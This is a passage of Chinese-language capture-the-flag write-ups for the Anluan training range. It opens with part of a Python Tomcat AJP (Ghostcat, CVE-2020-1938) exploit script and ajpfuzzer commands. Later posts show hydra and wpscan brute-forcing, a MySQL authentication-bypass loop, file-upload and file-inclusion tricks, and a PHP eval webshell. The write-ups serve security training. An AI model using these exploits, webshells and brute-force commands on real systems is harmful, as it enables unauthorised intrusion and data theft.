parser.add_subparsers()\tparser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)\tparser.add_argument(&quot;--port&quot;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)\tparser.add_argument(&#x27;-v&#x27;, &#x27;--verbose&#x27;, action=&#x27;count&#x27;, default=1)\tparser_bf = subparsers.add_parser(&#x27;bf&#x27;, help=&#x27;Bruteforce Basic authentication&#x27;)\tparser_bf.set_defaults(which=&#x27;bf&#x27;)\tparser_bf.add_argument(&quot;req_uri&quot;, type=str, default=&quot;/manager/html&quot;, help=&quot;Resource to attack&quot;)\tparser_bf.add_argument(&quot;-U&quot;, &quot;--users&quot;, type=str, help=&quot;Filename containing the usernames to test against the Tomcat manager AJP&quot;, required=True)\tparser_bf.add_argument(&quot;-P&quot;, &quot;--passwords&quot;, type=str, help=&quot;Filename containing the passwords to test against the Tomcat manager AJP&quot;, required=True)\tparser_bf.add_argument(&#x27;-s&#x27;, &#x27;--stop&#x27;, action=&#x27;store_true&#x27;, default=False, help=&quot;Stop when we find valid credz&quot;)#\tparser_req = subparsers.add_parser(&#x27;req&#x27;, help=&#x27;Request resource&#x27;)#\tparser_req.set_defaults(which=&#x27;req&#x27;)#\tparser_req.add_argument(&quot;-m&quot;, &quot;--method&quot;, type=str, default=&quot;GET&quot;, help=&quot;Request method (default=GET)&quot;, choices=AjpForwardRequest.REQUEST_METHODS.keys())\tparser_upload = subparsers.add_parser(&#x27;upload&#x27;, help=&#x27;Upload WAR&#x27;)\tparser_upload.set_defaults(which=&#x27;upload&#x27;)\tparser_upload.add_argument(&quot;filename&quot;, type=str, help=&quot;WAR file to upload&quot;)\tparser_upload.add_argument(&quot;-u&quot;, &quot;--user&quot;, type=str, default=None, help=&quot;Username&quot;)\tparser_upload.add_argument(&quot;-p&quot;, &quot;--password&quot;, type=str, default=None, help=&quot;Password&quot;)\tparser_upload.add_argument(&quot;-H&quot;, &quot;--headers&quot;, type=str, default=&#123;&#125;, help=&quot;Custom headers&quot;)\tparser_upload.add_argument(&quot;--old-version&quot;, action=&#x27;store_true&#x27;, default=False, help=&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;)\tparser_upload = subparsers.add_parser(&#x27;undeploy&#x27;, help=&#x27;Undeploy WAR&#x27;)\tparser_upload.set_defaults(which=&#x27;undeploy&#x27;)\tparser_upload.add_argument(&quot;path&quot;, type=str, help=&quot;Installed WAR path&quot;)\tparser_upload.add_argument(&quot;-u&quot;, &quot;--user&quot;, type=str, default=None, help=&quot;Username&quot;)\tparser_upload.add_argument(&quot;-p&quot;, &quot;--password&quot;, type=str, default=None, help=&quot;Password&quot;)\tparser_upload.add_argument(&quot;-H&quot;, &quot;--headers&quot;, type=str, default=&#123;&#125;, help=&quot;Custom headers&quot;)\tparser_upload.add_argument(&quot;--old-version&quot;, action=&#x27;store_true&#x27;, default=False, help=&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;)\tparser_version = subparsers.add_parser(&#x27;version&#x27;, help=&#x27;Get version&#x27;)\tparser_version.set_defaults(which=&#x27;version&#x27;)\tparser_upload = subparsers.add_parser(&#x27;list&#x27;, help=&#x27;List installed applications&#x27;)\tparser_upload.set_defaults(which=&#x27;list&#x27;)\tparser_upload.add_argument(&quot;-u&quot;, &quot;--user&quot;, type=str, default=None, help=&quot;Username&quot;)\tparser_upload.add_argument(&quot;-p&quot;, &quot;--password&quot;, type=str, default=None, help=&quot;Password&quot;)\tparser_upload.add_argument(&quot;-H&quot;, &quot;--headers&quot;, type=str, default=&#123;&#125;, help=&quot;Custom headers&quot;)\tparser_upload.add_argument(&quot;--old-version&quot;, action=&#x27;store_true&#x27;, default=False, help=&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;)\tread_file = subparsers.add_parser(&#x27;read_file&#x27;, help=&#x27;Exploit CVE-2020-1938&#x27;)\tread_file.set_defaults(which=&#x27;read_file&#x27;)\tread_file.add_argument(&quot;file_path&quot;, type=str, help=&quot;File to read&quot;)\tread_file.add_argument(&quot;-w&quot;, &quot;--webapp&quot;, type=str, default=&quot;&quot;, help=&quot;webapp potential params: &#x27;manager&#x27;, &#x27;host-manager&#x27;, &#x27;ROOT&#x27; or &#x27;examples&#x27;&quot;)\tread_file.add_argument(&quot;-o&quot;, &quot;--output&quot;, type=str, help=&quot;Output file (for binary files)&quot;)\targs = parser.parse_args()\tif args.verbose == 1:\t\tlogger.setLevel(logging.INFO)\telse:\t\tlogger.setLevel(logging.DEBUG)\tbf = Tomcat(args.target, args.port)\tif args.which == &#x27;bf&#x27;:\t\tbf.start_bruteforce(args.users, args.passwords, args.req_uri, args.stop)#\telif args.which == &#x27;req&#x27;:#\t\tprint bf.perform_request(args.req_uri, args.headers, args.method, args.user, args.password)\telif args.which == &#x27;upload&#x27;:\t\tbf.upload(args.filename, args.user, args.password, args.old_version, args.headers)\telif args.which == &#x27;version&#x27;:\t\tprint(bf.get_version())\telif args.which == &#x27;list&#x27;:\t\tapps = bf.list_installed_applications(args.user, args.password, args.old_version, args.headers)\t\tlogger.info(&quot;Installed applications:&quot;)\t\tfor app in apps:\t\t\tlogger.info(&#x27;- &#x27; + app)\telif args.which == &#x27;undeploy&#x27;:\t\tbf.undeploy(args.path, args.user, args.password, args.old_version, args.headers)\telif args.which == &#x27;read_file&#x27;:\t\tattributes = [\t\t\t&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.request_uri&quot;, &quot;/&quot;,)&#125;,\t\t\t&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.path_info&quot;, args.file_path,)&#125;,\t\t\t&#123;&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.servlet_path&quot;, &quot;/&quot;,)&#125;,\t\t]\t\thdrs, data = bf.perform_request(&quot;/&quot; + args.webapp + &quot;/xxxxx.jsp&quot;, attributes=attributes)\t\toutput = sys.stdout\t\tif args.output:\t\t\toutput = open(args.output, &quot;wb&quot;)\t\tfor d in data:\t\t\tif args.output:\t\t\t\toutput.write(d.data)\t\t\telse:\t\t\t\ttry:\t\t\t\t    output.write(d.data.decode(&#x27;utf8&#x27;))\t\t\t\texcept UnicodeDecodeError:\t\t\t\t    output.write(repr(d.data))\t\tif args.output:\t\t\toutput.close()\n\n0b110 getshell(三)\n下载 AJP 包构造器 ajpfuzzer ：wget https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar\n运行 ajpfuzzer：java -jar ajpfuzzer_v0.6.jar\n连接目标靶机端口：connect 106.15.50.112 18009\n执行如下命令构造并发送AJP包，其中/upload/2022-000047-000027.jpg为木马路径，其中/whalwl/11.jsp可以换为该web项目下任意目录中没有的jsp文件，如此tomcat才会去调用DefaultServletforwardrequest 2 &quot;HTTP/1.1&quot; &quot;/whalwl/11.jsp&quot; 127.0.0.1 127.0.0.1 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:11.jsp&quot;,&quot;javax.servlet.include.path_info:/upload/2022-000047-000027.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;\n\n\n0b111参考文档\n参考1：https://www.jianshu.com/p/440bc2662fc3\n参考4：https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd\n参考6：https://zhzhdoai.github.io/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/\n参考8：https://blog.csdn.net/Kris__zhang&#x2F;article&#x2F;details&#x2F;106232024\n\n0o02 CVE-2020-1938\n漏洞概述：2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布关于Apache Tomcat的安全公告，Apache Tomcat文件包含漏洞（CNVD-2020-10487，对应CVE-2020-1938）。Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器 webapp 下的任意文件，如 WEB-INF/web.xml。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。\n影响版本：Tomcat 6.x，7.x &lt; 7.0.100，8.x &lt;8.5.51，9.x &lt; 9.0.31。\n漏洞防护：① 更新至最新版本；② 禁用 AJP 协议，注释或删除 /conf/server.xml 的 &lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt; ；③ 配置 secret 以设置 AJP 协议的认证凭证，如 &lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;。注：YOUR_TOMCAT_AJP_SECRET 需设置更难猜解。\n漏洞解析：https://weread.qq.com/web/reader/c8732a70726fa058c87154bk76d325c028076dc611d6d8c\n参考文章：https://www.chaitin.cn/zh/ghostcat\n\n","categories":["靶场"],"tags":["安鸾","中间件"]},{"title":"安鸾之基础题系列&暴力破解系列","url":"/article/cac40ead.html","content":"0x00 前言\n很简单，但是，你行吗？\t–涂寐声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io\n\n0x01 基础题1、BurpSuite抓包题目URL：http://www.whalwl.site:8007提示：注意重放数据包查看返回包头寻找flagHint! 注意那个txt文件需要再访问一次才得到flag！Answer：\t1、bp抓取url中信息，直接获取返回包/发送至repeter模块，直接go（发包），从返回包获取txt文件名。\t2、访问http://www.whalwl.site:8007/27726623fabee80870ab072b70178308.txt获取flag。\n\n\n2、kali系统安装题目URL：http://www.whalwl.site:8008/提示：1、安装渗透测试系统kali2.02、利用web指纹识别工具whatweb获取flag，注意flag提交格式flag&#123;...&#125;命令格式：whatweb -v http://www.whalwl.site:8008/readme.html whatweb网站指纹识别：回答“什么是该网站？”\t常用命令：\t\twhatweb -v www.baidu.com\t\t# 单个扫描，并详细输出信息网站\t\twhatweb -i testweb.txt\t\t# 批量扫描\t\twhatweb www.baidu.com --log-xml=test.xml\t# 导出test.xml  \t\tAnswer：\t1、whatweb识别，出现信息Version: flag.b1d3bc89c37b907b959c6abc65e6c4bd。 \t2、直接访问http://www.whalwl.site:8008/readme.html，直接显示\t1、whatweb连接，version中直接为flag.b1d3bc89c37b907b959c6abc65e6c4bd。 \t3、需要修改为flag&#123;b1d3bc89c37b907b959c6abc65e6c4bd&#125;\n\n\n0x02 暴力破解1、ftp服务破解IP:118.190.133.35提供的password字典url：www.whalwl.cn/download?file_key=80499a6da1e70990050d52a19efb7d554d184b53da70d99c9f7d864518a23396&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349Answer：\t1、username.txt字典内容：\t\tanonymous\t\tadministrator\t\tftp\t\ttest\t\tadmin\t\tweb\t2、工具介绍：hydra--&gt;在线密码破解者  \t\t常用命令：\t\t\thydra -L username.txt -P top100pass.txt ftp://118.190.133.35 --&gt; 指定用户字典和密码字典对118.190.133.35开展ftp爆破。\t\t\thydra -l root -p root123 ssh://url --&gt; 单个用户与密码对url进行ssh爆破。\t\t\thydra -l admin -P ./password.txt url telnet -o telnet.txt --&gt; 单用户配密码字典对url展开telnet爆破，爆破结果放入telnet.txt文件。\t3、超级弱口令检查工具检测ftp 或 kail中使用hydra工具爆破：得到username：admin；password：zxcvbnm123。\t4、新版浏览器禁止FTP传输，请使用旧版浏览器访问；或直接使用ie浏览器；或Windows资源管理器中：ftp://118.190.133.35\t5、下载this_is_flag并作为文本文件打开，获取flag&#123;28eaf445c55159c5e2f4397bbc06154e&#125;\n\n\n\n\n\n2、telnet服务破解domain:www.whalwl.icuport:2323提供的password.txt文件：www.whalwl.cn/download?file_key=d194cc3f6e61a612f96a241b067f38a2e0bcaa7da7aa78fba5aed0225ec9735b&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349Answer：\t1、Username.txt:\t\tadmin\t\troot\t\tguest\t\tftp\t\twww\t2、hydra扫描（命令：hydra -L username.txt -P top100password.txt telnet://www.whalwl.icu:2323/）：username：admin；password：woaini1314520\t3、启动Windows的telnet服务：控制面板--&gt;程序--&gt;程序和功能--&gt;启用或关闭Windows功能--&gt;Telnet客户端。\t4、命令行窗口连接：telnet www.whalwl.icu 2323\t5、输入账号密码\t6、Linux命令：①cd ../../②ls③cat this_is_flag，得到flag&#123;95f5353104092bc55ad0aad7defb9295&#125;\n\n\n3、Mysql暴力破解IP：118.190.133.35PORT：3308提示：利用Mysql漏洞！！！ Answer：\t1、利用MySQL身份认证绕过漏洞（CVE-2012-2122）。\t\t①概念：当连接MariaDB/MySQL时，输入密码与正确密码比较，代码中的不正确处理导致memcmp()方法返回一个非零值，使MySQL认为俩密码相同。即只要知道用户名，不断尝试可直接登录SQL数据库。公告中提到尝试约256次有一次正确。\t\t②利用：nmap扫描，获取开放端口与数据库版本信息：nmap ip/domain\t2、不断for语句循环，找到切入点：for i in `seq 1 1000`; do mysql -uroot -ppassword -h 118.190.133.35 -P3308; done。\t3、sql语句操作\t\t①显示所有数据库：show databases;。\t\t②切到盲猜的可能数据库：use whalwl;。\t\t③显示数据库下的所有表：show tables;。\t\t④查找该表下所有数据：select * from flag;。\t4、获得flag&#123;d03d4082619be132cf07aa6e2724f854&#125;。 \n\n4、登录表单破解http://whalwl.icu:8088/Data：\t1、user.txt--&gt;www.whalwl.cn/download?file_key=78ed9fbdddbfcfcd4045932e174d5cb395676e29c704a5b82d298103be6edfb8&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349\t2、pass.txt--&gt;www.whalwl.cn/download?file_key=ac422d5c725070296c90c11a69c70a20463b061cfbfabb5c60dc0560dcbfb605&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349Answer：\t1、初步尝试，发现账户错误时会弹提示，如此可先尝试爆破出正确的用户名。\t2、burpsuite爆破：Intruder--&gt;Positions--&gt;添加爆破参数为账户名--&gt;Payloads--&gt;添加提供的字典user.txt；获得账户：admin和zachariah。\t3、同理，设密码为爆破变量，开始获取这两个账户的密码：admin--&gt;未爆到；zachariah--&gt;system2021。\t4、登录获得flag。\n\n\n\n\n\n\n5、一句话密码破解http://whalwl.icu:8089/tips:别怪字典太大，方法可能不对！Data：\tpass.zip--&gt;www.whalwl.cn/download?file_key=1783aa6a0d69cdae6a9bde3b38715b690ea841778127b0ce0d1123f8911d89a7&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349Answer：\t1、dirsearch目录扫描，是否有他人上传的可以木马文件，命令：python37 dirsearch.py -u http://whalwl.icu:8089/；发现rabot.txt文件状态码为200。\t2、打开rabot.txt，根据其中内容访问url，仅发现http://whalwl.icu:8089/.webconsole.php有点意思，应该就是它了，我滴小马马。\t3、工具下载：K8_FuckOneShell链接：https://github.com/fan-ch/K8tools/blob/master/K8_FuckOneShell_20161224%255BK.8%255D.rar\t2、将安鸾提供的pass.txt文件替代原本的pass.txt的；启动工具开始爆破得到密码vvvvvvvangel。\t3、中国菜刀连接，写入url和password。\t4、在根目录下可以看到.flag文件，获取flag&#123;dc6a19854e5a82ea97d486ccd98e39d0&#125;。\t5、不建议使用burp爆破，速度真的慢。\t6、通过HackBar可知，当password=echo &quot;Correct password!\\n&quot;;中的password为一句话木马的密码时，会回显Correct password!。具体看下图。\t7、bp抓包时，需要把Get请求转为Post请求，才可使用password=echo &quot;Correct password!\\n&quot;;进行判断密码的正确性。\t8、将password设为变量，导入提供的字典，靶场，线程可以调大点。但还是很慢。\t9、菜刀连接，同上。\n\n\n\n\n\n\n\n\n\n\n6、SSH离线破解test@118.190.133.35:22000tips：离线破解题目，禁止在线破解，服务器刚不住！Data：\t提供的字典john.zip：www.whalwl.cn/download?file_key=32ab8ca8e16274db45c880c52568e6b0af275e2261da3ea2fe1e936b213f7a83&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349  Answer：\t1、shadow中内容简单介绍：test:$6$xxx.:18833:0:99999:7:::中的test为账户，第一$代表加密方式，第二个$后边是加后的密码。\t2、工具介绍：john（线密码破解者）\t\t常用命令：\t\t\tjohn --wordlist=./dict.txt ./shadow --&gt; 指定字典dict.txt爆破shadow文件。\t\t\tjohn ./shadow --&gt; 不指定字典，直接拿john提供的字典来爆破shadow文件。\t\t\tjohn --show ./shadow --&gt; 查上次爆破结果，在shadow文件中。 \t3、john离线爆破，或hydra在线爆破（hydra -l test -P ./pass.txt ssh://118.190.133.35:22000），成功获取密码：zmmydfz@10086\t4、使用 FinalShell 或 XShell 连接SSH，认证方式选择Keyboard Interactive。\t5、命令行窗口执行①cd ../../②ls③cat this_is_flag得到flag信息：flag&#123;1f73c112d66b314697d68115e06c409b&#125;23888028fc0a:/$。\n\n\n\n\n7、wordpress后台破解http://whalwl.icu:8090/ Data：\tdict.txt:www.whalwl.cn/download?file_key=75ee1b85e1e08d552eb3e4e5f66de810aa7fd2497888e22e2946cdb0d7bb662b&amp;team_key=462ef4f9890b58a7f1802c05458b0ed2e22935623925103684c595d08486d349  Answer:\t1、工具使用：WPScan（针对WordPress的安全扫描器）。\t\t常用命令：\t\t\twpscan --update\t--&gt;更新漏洞库。\t\t\twpscan --url http://whalwl.icu:8090/ --&gt; 扫描站点的WordPress漏洞。\t\t\twpscan --url http://127.0.0.1/ --enumerate u --&gt; 枚举站点的wordpress用户。\t\t\twpscan --url http://127.0.0.1/ --enumerate vt --&gt; 扫描站点主题中的漏洞。\t\t\twpscan --url http://127.0.0.1/ --enumerate p --&gt; 扫描站点插件中的漏洞。\t\t\twpscan --url http://127.0.0.1/wordpress -evp --&gt; 枚举站点易攻击插件。\t\t\twpscan --url http://127.0.0.1/ --usernames &#x27;admin&#x27; -P dict.txt --&gt; 对指定账户使用dict.txt字典进行密码爆破。\t\t\twpscan --url http://127.0.0.1/ -P password.txt -U username.txt --&gt; 指定账户和密码字典，对站点进行爆破。\t2、先爆用户名：pscan --url http://whalwl.icu:8090/ --enumerate u 获得用户名：whalwlweb。\t3、使用提供的字典爆破密码wpscan --url http://whalwl.icu:8090/ --usernames &#x27;whalwlweb&#x27; -P dict.txt ，得到sername: whalwlweb, Password: ringi2202727。\t4、翻了下百度，找到wordpress的登录口，改一下直接访问：http://whalwl.icu:8090/wp-login.php。\t5、登录后直接获得flag&#123;1514058d0a9fc839cb85666b2f47af00&#125;。\n\n\n\n0x03 后记\n写出这篇文章，感觉还有许许多多的不足，但感谢自己坚持写下来。希望其他师傅看到不足的可以指出，谢谢！\n\n","categories":["靶场"],"tags":["基础","安鸾"]},{"title":"安鸾之安全基础新增","url":"/article/3d84fd37.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！\n本文首发于 涂寐’s Blogs：https://0xtlu.github.io/\n\n提示文件类型http://47.100.220.113:8023/\n\n思路目录遍历，下 flag 压缩包\n\n\n……解压后，看不到啥玩意，就5个flag-*\n\n这种题都和文件头有挺多关系的……WinHex 打开，根据文件头判断\n\n可寻找在线识别文件格式的站点，eg.https://www.fly63.com/tool/filetype/\n\n\n文件名--&gt;文件头--&gt;文件类型--&gt;部分flag--&gt;执行命令flag-1--&gt;ffd8ffe0--&gt;jpg--&gt;flag-1：flag&#123;6e9--&gt;flag-1.jpgflag-2--&gt;4d5a9000--&gt;exe--&gt;flag-2:5963f6ef5--&gt;终端运行：flag-2.exeflag-3--&gt;7f454c46--&gt;sh--&gt;flag-3:9109213--&gt;./flag-3flag-4--&gt;4d5a9000--&gt;exe--&gt;flag-4:640c98b--&gt;开放 127.0.0.1:8888，终端运行：flag-4.exeflag-5--&gt;504b0304--&gt;zip--&gt;flag-5:5c25d0&#125;--&gt;java -jar flag-5#注：flag&#123;6e95963f6ef59109213640c98b5c25d0&#125;\n\nflag-1没啥好说的，根据文件头改后缀名（flag-1.jpg）直接打开图片查看\n\nflag-2看后缀修改为 exe 运行，一闪而过，想到之前运行 C 没有暂停界面，故终端打开（flag-2.exe）可显示执行结果\n\nflag-3文件头可以知道为 ELF 文件，利用 readelf -h flag-3  得知该 ELF 文件属于 EXEC 类型（可执行文件），故通过 ./flag-3 执行该文件\n\nflag-4根据文件头判断为 exe 文件，根据 WinHex 提示，判断为 python 文件封装，运行，根据报错，利用 phpstudy 提供本地 8888 端口的站点，终端运行 flag-4.exe 回显部分 flag\n\nflag-5直接搜文件头为 zip 文件，直接解压后发现有 class 后缀文件，想到了 java（java -jar flag-5），后面又继续搜查，发现为可能为 zip 伪加密，具体……未了解\n\n","categories":["靶场"],"tags":["基础","安鸾"]},{"title":"安鸾之文件上传系列","url":"/article/27643a55.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io，转载请注明出处！\n\n0x00 Nginx解析漏洞0o00 题目提示Nginx解析漏洞题目URL：http://106.15.50.112:8020/提示：flag在网站根目录下\n\n0o01 上传流程\n直接访问，提供一个上传点，错误上传：Please ensure you are uploading an image.；白名单？？？\n直接传图片马，前端回显文件路径：File uploaded successfully: /var/www/html/uploadfiles/xxx.jpg。\n重复上传，这……还是根据文件原名重命名的吗？？？\n继续，File uploaded exceeds maximum upload size.，限大小，png确实比较大。\n和其他师傅沟通了下，这站点似乎就是不给你看图片的，但直接给图片码进行解析漏洞就好了……但一毛一样的一句话，我咋就不行呢，直接用师傅的又可以，是我合成的方法有问题吗……大佬说，玄学……\n好了，建国之后不准成精。看下吧，我的图片码和师傅的有啥不同：\n\n\n\n对的，师傅的 jpg 图里是 png图片的内容，所以……找张小尺寸的 png 图重新生成图片码。\n蚁剑：http://106.15.50.112:8020/uploadfiles/xxx.jpg/.php\n网站根目录拿 flag ：flag&#123;96447a6a5d809890&#125; //-- 2022.1.20\n\n\n0o02 Nginx解析漏洞\n漏洞原理：若访问路径为 .../test.png/test1.php ， 当 fastcgi 在处理 .php 文件时发现文件不存在， 则根据 php.ini 配置文件中 cgi.fix_pathinfo=1 的配置项选择是否修复路径，即当前路径不存在时则采用上层路径.../test.png。故，此时交由 fastcgi 处理的文件就变成.../test.png，.../test.png 也将作为 .../test.png/test1.php进行解析，即当作 php 文件解析。\n注：php-fpm.conf 中的 security.limit_extensions 配置项限制 fastcgi 解析文件的类型，即指定某类型文件可作为代码解析。当此项设置为空时，允许 fastcgi 将.png 等文件作为代码解析。\n漏洞成因：php 和 nginx 间的配置问题。\n漏洞修复：① 将 php.ini 文件中的 cgi.fix_pathinfo 设置为 0，取消路径修复功能； ② php-fpm.conf 中的 security.limit_extensions 设置为 .php，指定可解析文件类型。\n\n0x00 文件上传010o00 题目提示文件上传01题目URL：http://106.15.50.112:8024/提示：flag在网站根目录下\n\n0o01 上传流程\n找到上传点：http://106.15.50.112:8024/admin.php \n直接禁用 js，上传 php 文件，或bp改图片码后缀为 php 。\n注意，网站根目录/var/www/html/，不是服务器根目录：flag&#123;6687ee3215bbd38a&#125;。\n\n\n0x00 文件上传020o00 题目提示文件上传02题目URL：http://106.15.50.112:8025/提示：flag在服务器根目录\n\n0o01 上传流程\n看着首页……总想着是被黑了吗？扫一波目录先（bb，其实可以直接在 URL 上加 ~~&#96;&#x2F;upload.php&#96; 测试，算了还是得多用下目录扫描）~~。\n\n废话太多了，上链接：http://106.15.50.112:8025/upload.php。\n\n禁 js ，传 php ，没反应。\n\n正常点，传个图片，正常显示，拿到图片路径，且图片重命名。\n\n测试其他后缀，不行，盲猜白名单，再分析下请求包：\nConnection: close------WebKitFormBoundaryAYlZtBqmFuaASUG6Content-Disposition: form-data; name=&quot;file_path&quot;images/------WebKitFormBoundaryAYlZtBqmFuaASUG6Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;php.jpg&quot;Content-Type: image/jpeg�PNG\n\nfile_path？？？images/？？？这路径，可以改改吧，\n\n想了下似乎很符合%00截断，回顾下笔记，php version &lt; 5.3.4，而站点的是 5.3.3\n\n修改路径：images/test.php；在路径后一个字符直接添加并 URL 编码%00，或 Hex 中直接修改后一个字符的十六进制为00。\n\n通过%00 截断，上传的图片将被命名为 test.php \n\n蚁剑连接：http://106.15.50.112:8025/images/test.php\n\n服务器根目录：flag&#123;c325cb3922a0e48c&#125;\n\n\n\n","categories":["靶场"],"tags":["安鸾","文件上传"]},{"title":"安鸾之文件包含系列","url":"/article/6edc2289.html","content":"0x00 开题说明\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io\n\n0x01 LFI本地文件包含0o00 题目提示LFI本地文件包含题目URL：http://106.15.50.112:8014提示：flag在网站跟目录下！\n\n0o01 文件包含\n产生原因：程序员为更好地使用代码的重用性，引入文件包含函数，通过文件包含函数将文件包含到程序中，以便直接使用包含文件的代码。\n造成影响：直接读取服务器上文件，导致敏感文件泄露。若结合文件上传漏洞，将造成更大破坏。\n再次分类：①本地文件包含（LFI，服务器上资源）②远程文件包含（RFI，服务器外资源）。\n存在应用：web应用等都有存在，仅是 php 的摊子较大，较容易爆出该方面漏洞，故常被用来举例。\n注入点：观察URL链接中的page/include/path/file/link/url等字段。\n注：文件包含不是漏洞，能被攻击者控制才形成漏洞。\n\n0o02 包含过程\n先拿新装的 Nessus 扫一波，看图吧。此处仅试试 Nessus 使用效果，后续看情况利用。\n\n拿 dirsearch 扫一波：dirsearch -u http://106.15.50.112:8014 -i 200 -t 5。\n\n分别访问下目录：http://106.15.50.112:8014/upload/是几张图，大致是上传时的图片马，点开火绒一个劲的报毒；http://106.15.50.112:8014/upload.php则是一个上传点，且存在白名单限制；http://106.15.50.112:8014/index.php?file=test.php一看就不正经，修改test.php为/etc/passwd，得到靶机系统中所有的用户和用户的主要信息，另两个目录类似。\n\n彩蛋：this_is_th3_F14g_27726623fabee80870ab072b70178308.txt。\n\n具体测试发现，上传点检测后缀以及Content-Type，上传成功后返回路径。\n\n构造图片马直接上传，通过站点暴露地文件包含功能执行使图片马中的php代码（http://106.15.50.112:8014/index.php?file=upload/20xxx.jpg），生成tumei.php文件，其内容为&lt;?php @eval($_POST[&quot;tumei&quot;]);?&gt;，拿蚁剑连接。\n\n注：若URL链接路径不存在，直接跳转到http://106.15.50.112:8014/index.php?file=test.php。\n\n代码审计(未放出)\n\n针对upload.php：\n\n\n\nempty($_FILES[&quot;file&quot;])进行文件判空；\nexplode()点分割上传的文件名，拿到最后一个点后的内容（上传的后缀）;\n通过@$_FILES[&quot;file&quot;][&quot;type&quot;]判断上传文件的MIME 类型，@$_FILES[&quot;file&quot;][&quot;size&quot;]判断文件大小，以及in_array()判断后缀是否符合要求。\n若符合，则组合当前时间、1000~9999随机数以及提取的后缀形成新的文件名；\n之后，通过move_uploaded_file()移动上传到服务器的临时文件到upload目录下，具体：move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename)。\n最后，通过file_get_contents()将保存的文件内容写入到一个字符串中（图片内容为二进制数据），file_put_contents()重新写入到upload/filename文件中，最后的最后echo回显前端。\n\n\n针对index.php：\n\n\n通过isset($_GET[&#39;file&#39;])判断变量被设置且非NULL。\n符合要求，则获取包含文件名，即$_GET[&#39;file&#39;]的内容；同时，isset($file)判断是否设置且非NULL。\n符合条件，则preg_match(&#39;/php:\\/\\/|http|data|ftp|input|%00/i&#39;, $file)进行正则判断，使无法远程包含、其他协议利用；strstr($file,&quot;..&quot;)判断是否含有多余的..，避免目录遍历；strlen($file)判断文件名长度。如上条件，一个不符直接报NAIVE!!!。反之，include($file)引入并执行$file中文件内容。\n注：找到http://106.15.50.112:8014/index.php?file=访问上传的图片时内容乱码的原因（直接访问图片文件，另存为，本地查看不乱码）——include()所致。具体原因，说是引入文件和当前文件字符集编码不一致？打住，这不是重点，跳过。懂的师傅可以留言……\n\n0o03 参考资料0x02 LFI本地文件包含020o00 题目提示LFI本地文件包含02题目URL：http://106.15.50.112:8028/提示：flag在服务器根目录。\n0o01 包含过程\n访问链接，一股熟悉感涌上心头，看轮播图像那啥凡模板来着。先扫目录吧……找到一堆目录遍历和一个登录口。登录口果断一波弱口令，嘿admin/admin。\n\n观察后台，！！！文件包含！！！看样子就添加频道那比较像，频道模板和详情模板调用了php文件。老规矩喽，上图片马，再包含。\n\n上传文件时。\n\n图片路径：uploadfile/image/20220611/20220611172627_53530.jpg。\n\n由于不知道c_article.php的路径，想到使用绝对路径/var/www/html/uploadfile/image/20220611/20220611172627_53530.jpg访问图片马，无果（都指定网站根目录了，还给我访问其他目录？？？）。改用../不断测试其在哪个上级目录，以找到网站根目录，再返回去查找图片马的位置，使文件包含成功实现，此处使用../../uploadfile/image/20220611/20220611172627_53530.jpg成功。\n\ngetshell后。\n\n模型文件路径：/var/www/html/template/1/c_article.php。\n\n服务器根目录的flag：flag&#123;e338c8f9ada22f53&#125;。\n\n后面，dirsearch扫完，阿狸个粑粑\n\n\n0x03 